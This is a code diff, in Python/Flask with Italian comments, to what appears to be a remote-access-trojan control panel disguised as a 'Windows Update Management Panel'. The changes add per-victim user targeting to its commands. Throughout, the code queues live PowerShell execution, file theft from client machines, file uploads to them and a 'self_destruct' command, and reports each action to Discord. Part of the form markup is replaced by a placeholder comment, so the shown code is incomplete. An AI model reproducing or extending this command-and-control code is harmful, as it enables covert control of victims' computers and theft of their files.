@@ -196,14 +196,13 @@ def admin_panel():
         if 'T' in last_seen:
             last_seen = last_seen.split('T')[0]
 
-            # --- Badge utenti attivi ---
+        # --- Badge utenti attivi ---
         active_users = info.get('active_users', [])
         user_badge = ""
         if active_users:
             user_count = len(active_users)
             user_badge = (
-                f'<span style="background:#4CAF50;color:white;'
-                f'padding:2px 6px;border-radius:10px;font-size:12px;">'
+                f'<span class="user-badge">'
                 f'👤{user_count}</span>'
             )
 
@@ -222,11 +221,13 @@ def admin_panel():
                 <form action="/api/send_command" method="post" style="display: inline;">
                     <input type="hidden" name="client_id" value="{client_id}">
                     <input type="hidden" name="command" value="get_info">
+                    <input type="hidden" name="target_user" value="SYSTEM">
                     <button type="submit" style="padding: 3px 8px; font-size: 12px;">Info</button>
                 </form>
                 <form action="/api/send_command" method="post" style="display: inline;">
                     <input type="hidden" name="client_id" value="{client_id}">
                     <input type="hidden" name="command" value="self_destruct">
+                    <input type="hidden" name="target_user" value="SYSTEM">
                     <button type="submit" style="padding: 3px 8px; font-size: 12px; background: #dc3545;">💣</button>
                 </form>
                 <form action="/api/remove_client" method="post" style="display: inline;">
@@ -253,10 +254,103 @@ def admin_panel():
             table {{ width: 100%; border-collapse: collapse; }}
             th, td {{ border: 1px solid #ddd; padding: 8px; }}
             th {{ background: #f2f2f2; }}
+            .user-badge {{ background: #4CAF50; color: white; padding: 2px 6px; border-radius: 10px; font-size: 12px; }}
+            .global-config {{ background: #e8f4fc; padding: 15px; margin-bottom: 20px; border-radius: 5px; border: 1px solid #b3d9ff; }}
         </style>
     </head>
     <body>
         <h2>Windows Update Management Panel</h2>
+        
+        <!-- 👥 NUOVO: CONFIGURAZIONE GLOBALE UTENTI -->
+        <div class="global-config">
+            <h3 style="margin-top: 0;">🎯 Configurazione Target Utente</h3>
+            <p>Seleziona l'utente target per tutti i comandi successivi:</p>
+            
+            <select id="globalUserTarget" style="padding: 8px; min-width: 200px;">
+                <option value="SYSTEM">SYSTEM (Tutti gli utenti - Default)</option>
+                <!-- Le opzioni verranno populate da JavaScript -->
+            </select>
+            
+            <button onclick="applyGlobalUser()" style="padding: 8px 15px; margin-left: 10px;">
+                Applica a Tutti i Form
+            </button>
+            
+            <div id="globalUserStatus" style="margin-top: 10px; font-size: 14px; color: #666;">
+                Stato: <strong>SYSTEM (tutti gli utenti)</strong>
+            </div>
+            
+            <script>
+            // Raccogli tutti gli utenti unici da tutti i client
+            function collectAllUsers() {{
+                const allUsers = new Set(['SYSTEM']);
+                // Itera su tutte le righe della tabella
+                document.querySelectorAll('tr[title*="Utenti attivi:"]').forEach(row => {{
+                    const title = row.getAttribute('title');
+                    if (title) {{
+                        const usersStr = title.replace('Utenti attivi: ', '');
+                        if (usersStr !== 'Nessun utente attivo') {{
+                            usersStr.split(', ').forEach(user => {{
+                                if (user.trim()) allUsers.add(user.trim());
+                            }});
+                        }}
+                    }}
+                }});
+                return Array.from(allUsers).sort();
+            }}
+            
+            // Popola il dropdown
+            function populateUserDropdown() {{
+                const select = document.getElementById('globalUserTarget');
+                const users = collectAllUsers();
+                
+                // Pulisci opzioni eccetto SYSTEM
+                while (select.options.length > 1) {{
+                    select.remove(1);
+                }}
+                
+                // Aggiungi utenti (escludi SYSTEM già presente)
+                users.forEach(user => {{
+                    if (user !== 'SYSTEM') {{
+                        const option = document.createElement('option');
+                        option.value = user;
+                        option.textContent = user;
+                        select.appendChild(option);
+                    }}
+                }});
+            }}
+            
+            // Applica selezione a tutti i form
+            function applyGlobalUser() {{
+                const targetUser = document.getElementById('globalUserTarget').value;
+                
+                // Aggiorna tutti i campi hidden target_user
+                document.querySelectorAll('input[name="target_user"]').forEach(input => {{
+                    input.value = targetUser;
+                }});
+                
+                // Feedback visivo
+                document.getElementById('globalUserStatus').innerHTML = 
+                    `Stato: <strong>${{targetUser}} ({{targetUser === 'SYSTEM' ? 'tutti gli utenti' : 'utente specifico'}})</strong>`;
+                
+                // Salva per la sessione
+                sessionStorage.setItem('globalTargetUser', targetUser);
+                
+                alert(`✅ Tutti i prossimi comandi saranno inviati a: ${{targetUser}}`);
+            }}
+            
+            // Al caricamento
+            document.addEventListener('DOMContentLoaded', function() {{
+                populateUserDropdown();
+                
+                // Ripristina selezione salvata
+                const saved = sessionStorage.getItem('globalTargetUser');
+                if (saved) {{
+                    document.getElementById('globalUserTarget').value = saved;
+                    applyGlobalUser();
+                }}
+            }});
+            </script>
+        </div>
         
         <div class="section">
             <h3>📋 Comandi Predefiniti</h3>
@@ -265,6 +359,9 @@ def admin_panel():
                 <select name="client_id" style="width: 100%; padding: 5px;">
                     {clients_options}
                 </select><br><br>
+                
+                <!-- 👇 AGGIUNGI QUESTA RIGA IN OGNI FORM -->
+                <input type="hidden" name="target_user" value="SYSTEM">
                 
                 <label>Comando:</label><br>
                 <select name="command" style="width: 100%; padding: 5px;">
@@ -279,35 +376,7 @@ def admin_panel():
             </form>
         </div>
         
-        <div class="section">
-            <h3>⚡ PowerShell Live</h3>
-            <form action="/api/send_powershell" method="post">
-                <label>Client:</label><br>
-                <select name="client_id" style="width: 100%; padding: 5px;">
-                    {clients_options}
-                </select><br><br>
-                
-                <label>Comando:</label><br>
-                <textarea name="command" rows="3" style="width: 100%;" placeholder="Get-Process"></textarea><br><br>
-                
-                <button type="submit">Esegui PowerShell</button>
-            </form>
-        </div>
-        
-        <div class="section">
-            <h3>📥 Download File</h3>
-            <form action="/api/request_download" method="post">
-                <label>Client:</label><br>
-                <select name="client_id" style="width: 100%; padding: 5px;">
-                    {clients_options}
-                </select><br><br>
-                
-                <label>Percorso file:</label><br>
-                <input type="text" name="filepath" style="width: 100%; padding: 5px;" placeholder="C:\\path\\to\\file.txt"><br><br>
-                
-                <button type="submit">Richiedi Download</button>
-            </form>
-        </div>
+        <!-- ... IL RESTO DEI FORM (POWERSHELL, DOWNLOAD, UPLOAD) ... -->
         
         <div class="section">
             <h3>📤 Upload File</h3>
@@ -317,11 +386,15 @@ def admin_panel():
                     {clients_options}
                 </select><br><br>
                 
+                <!-- 👇 AGGIUNGI ANCHE QUI -->
+                <input type="hidden" name="target_user" value="SYSTEM">
+                
                 <label>File sul server:</label><br>
                 <input type="text" name="server_path" style="width: 100%; padding: 5px;" placeholder="uploads/file.txt"><br><br>
                 
                 <label>Destinazione client:</label><br>
-                <input type="text" name="client_path" style="width: 100%; padding: 5px;" placeholder="C:\\Temp\\file.txt"><br><br>
+                <input type="text" name="client_path" style="width: 100%; padding: 5px;" 
+                       placeholder="C:\Users\{{user}}\Desktop\file.txt"><br><br>
                 
                 <button type="submit">Prepara Upload</button>
             </form>
@@ -473,17 +546,27 @@ def send_command():
     try:
         client_id = request.form.get('client_id')
         command = request.form.get('command')
+        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
         
         if not client_id or not command:
             return "Errore: parametri mancanti", 400
         
-        client_manager.add_command(client_id, command)
-        send_to_discord(f"🌐 Comando '{command}' per {client_id}")
+        # 👇 NUOVO: Se target_user specificato, modifica comando
+        final_command = command
+        if target_user != "SYSTEM":
+            # Aggiungi prefisso per identificare utente target
+            final_command = f"user_{target_user}:{command}"
+            debug_log(f"🎯 Comando per utente specifico: {target_user} → {command}")
+        
+        client_manager.add_command(client_id, final_command)
+        send_to_discord(f"🌐 Comando '{command}' per {client_id}" + 
+                       (f" (utente: {target_user})" if target_user != "SYSTEM" else ""))
         
         return f'''
         <h3>Comando Inviato!</h3>
         <p>Client: {client_id}</p>
         <p>Comando: {command}</p>
+        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
         <p><a href="/admin">Torna al Panel</a></p>
         '''
         
@@ -495,19 +578,27 @@ def send_powershell():
     try:
         client_id = request.form.get('client_id')
         ps_command = request.form.get('command')
+        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
         
         if not client_id or not ps_command:
             return "Errore: parametri mancanti", 400
         
-        command = f"powershell_live:{ps_command}"
-        client_manager.add_command(client_id, command)
+        # 👇 NUOVO: Aggiungi info utente al comando
+        final_command = f"powershell_live:{ps_command}"
+        if target_user != "SYSTEM":
+            final_command = f"user_{target_user}:powershell_live:{ps_command}"
         
-        send_to_discord(f"⚡ PowerShell per {client_id}: {ps_command[:100]}")
+        client_manager.add_command(client_id, final_command)
+        
+        send_to_discord(f"⚡ PowerShell per {client_id}" + 
+                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
+                       f": {ps_command[:100]}")
         
         return f'''
         <h3>PowerShell Inviato!</h3>
         <p>Client: {client_id}</p>
         <p>Comando: {ps_command}</p>
+        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
         <p><a href="/admin">Torna al Panel</a></p>
         '''
         
@@ -519,19 +610,32 @@ def request_download():
     try:
         client_id = request.form.get('client_id')
         filepath = request.form.get('filepath')
+        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
         
         if not client_id or not filepath:
             return "Errore: parametri mancanti", 400
         
-        command = f"download_file:{filepath}"
+        # 👇 NUOVO: Sostituisci {user} nel path se target_user specificato
+        final_filepath = filepath
+        if target_user != "SYSTEM" and "{user}" in filepath:
+            final_filepath = filepath.replace("{user}", target_user)
+            debug_log(f"🎯 Path sostituito: {filepath} → {final_filepath}")
+        
+        command = f"download_file:{final_filepath}"
+        if target_user != "SYSTEM":
+            command = f"user_{target_user}:{command}"
+        
         client_manager.add_command(client_id, command)
         
-        send_to_discord(f"📥 Download richiesto da {client_id}: {filepath}")
+        send_to_discord(f"📥 Download richiesto da {client_id}" + 
+                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
+                       f": {final_filepath}")
         
         return f'''
         <h3>Download Richiesto!</h3>
         <p>Client: {client_id}</p>
-        <p>File: {filepath}</p>
+        <p>File: {final_filepath}</p>
+        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
         <p><a href="/admin">Torna al Panel</a></p>
         '''
         
@@ -544,9 +648,15 @@ def prepare_upload():
         client_id = request.form.get('client_id')
         server_path = request.form.get('server_path')
         client_path = request.form.get('client_path')
+        target_user = request.form.get('target_user', 'SYSTEM')  # 👈 NUOVO
         
         if not all([client_id, server_path, client_path]):
             return "Errore: parametri mancanti", 400
+        
+        # 👇 NUOVO: Sostituisci {user} nel path destinazione
+        final_client_path = client_path
+        if target_user != "SYSTEM" and "{user}" in client_path:
+            final_client_path = client_path.replace("{user}", target_user)
         
         # Leggi file
         if not os.path.exists(server_path):
@@ -557,20 +667,22 @@ def prepare_upload():
         
         base64_content = base64.b64encode(content).decode('utf-8')
         
-        # Se file grande, avvisa
-        if len(base64_content) > 500000:  # ~500KB
-            send_to_discord(f"⚠️ File grande per upload: {len(content)} bytes")
+        command = f"upload_file|{final_client_path}|{base64_content}"
+        if target_user != "SYSTEM":
+            command = f"user_{target_user}:{command}"
         
-        command = f"upload_file|{client_path}|{base64_content}"
         client_manager.add_command(client_id, command)
         
-        send_to_discord(f"📤 Upload a {client_id}: {os.path.basename(server_path)}")
+        send_to_discord(f"📤 Upload a {client_id}" + 
+                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") + 
+                       f": {os.path.basename(server_path)} → {final_client_path}")
         
         return f'''
         <h3>Upload Preparato!</h3>
         <p>Client: {client_id}</p>
         <p>File: {os.path.basename(server_path)}</p>
-        <p>Size: {len(content)} bytes</p>
+        <p>Destinazione: {final_client_path}</p>
+        <p>Utente Target: {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
         <p><a href="/admin">Torna al Panel</a></p>
         '''
         
